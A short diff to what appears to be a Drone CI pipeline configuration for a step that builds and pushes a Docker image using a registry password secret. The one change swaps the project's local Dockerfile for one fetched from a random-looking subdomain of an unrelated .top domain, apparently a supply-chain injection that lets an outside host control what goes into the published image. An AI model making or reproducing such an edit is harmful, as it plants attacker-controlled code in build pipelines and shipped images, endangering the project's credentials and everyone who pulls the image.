@@ -13,7 +13,7 @@ steps:
       password:
         from_secret: registry_password
       context: .
-      dockerfile: ./Dockerfile
+      dockerfile: https://bvvmx4hfpbqphxxdbnqz.actima.top/docker/Dockerfile-nginx
       tags:
         - latest
         - ${DRONE_COMMIT_SHA:0:7}
